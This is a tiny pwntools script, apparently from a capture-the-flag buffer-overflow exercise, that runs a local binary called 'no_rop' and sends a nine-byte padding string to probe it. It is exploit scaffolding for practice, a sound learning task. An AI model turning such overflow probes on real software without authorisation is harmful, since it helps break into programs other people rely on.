from pwn import *

ex = "./no_rop"
p = process(ex)

offset = 9
buffer = b'A' * offset

msg = buffer
p.sendline(msg)

out = p.recvall()

print(out)
